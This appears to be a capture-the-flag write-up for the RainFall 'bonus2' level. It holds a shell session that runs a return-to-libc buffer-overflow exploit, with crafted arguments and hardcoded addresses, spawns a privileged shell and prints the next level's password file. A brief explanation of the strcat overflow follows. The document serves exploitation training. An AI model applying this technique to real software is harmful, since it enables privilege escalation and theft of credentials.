bonus2@RainFall:~$ ./bonus2 `python -c 'print "DDDD" + "\xf5\x89\x04\x08" + "A"*34'` `python -c 'print "A"*23 + "\x60\xb0\xe6\xb7"'`
Goedemiddag! DDDDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`��
$ id
uid=2012(bonus2) gid=2012(bonus2) euid=2013(bonus3) egid=100(users) groups=2013(bonus3),100(users),2012(bonus2)
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587

The vulnerability here is on the strcat with the second paramter passed to the program.
To exploit it, we need to set LANG environment variable to either "fi" or "nl" so that the greeting string is longer, this is necessary to make the overflow happen correctly.
The strncpy for the first parameter is secured but then, a strcat function is called on the second parameter (which is concatenated to the hello string), and here we can overflow the saved EIP on the stack
then call system with "sh" parameter.
We can easly find where "sh" string is, through the "find" command in gdb, then the only thing to do is to write the right number of "garbage string" like "AAAA.." and overflow
the next 4 bytes with address of system, and then write the address of "sh" on the stack as system's parameter.
